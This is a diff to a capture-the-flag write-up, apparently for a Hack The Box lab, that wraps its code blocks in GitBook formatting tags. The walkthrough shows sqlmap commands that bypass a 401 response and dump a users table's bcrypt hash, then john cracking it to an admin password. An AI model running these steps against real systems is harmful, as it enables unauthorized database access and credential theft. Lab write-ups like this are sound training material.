@@ -34,14 +34,17 @@ Tried SQLMap but it fails due to `401: Unauthorized`.
 
 Luckily, we can just ignore that HTTP code.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch --ignore-code 401
 
 [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
 ```
+{% endcode %}
 
 Find the databases.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch --ignore-code 401 --dbs
 
@@ -50,9 +53,11 @@ available databases [3]:
 [*] korp_terminal
 [*] test
 ```
+{% endcode %}
 
 Then the tables.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal --tables
 
@@ -60,9 +65,11 @@ sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal --tables
 | users |
 +-------+
 ```
+{% endcode %}
 
 Dump the passwords.
 
+{% code overflow="wrap" %}
 ```bash
 sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal -T users -C password --dump
 
@@ -72,19 +79,24 @@ sqlmap -r new.req --batch --ignore-code 401 -D korp_terminal -T users -C passwor
 | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. |
 +--------------------------------------------------------------+
 ```
+{% endcode %}
 
 Crack the `bcrypt` hash with `john`.
 
+{% code overflow="wrap" %}
 ```bash
 john hash --wordlist=$rockyou
 
 password123
 ```
+{% endcode %}
 
 Log in to the app and receive the flag.
 
+{% code overflow="wrap" %}
 ```bash
 admin:password123
 ```
+{% endcode %}
 
 Flag: `HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`
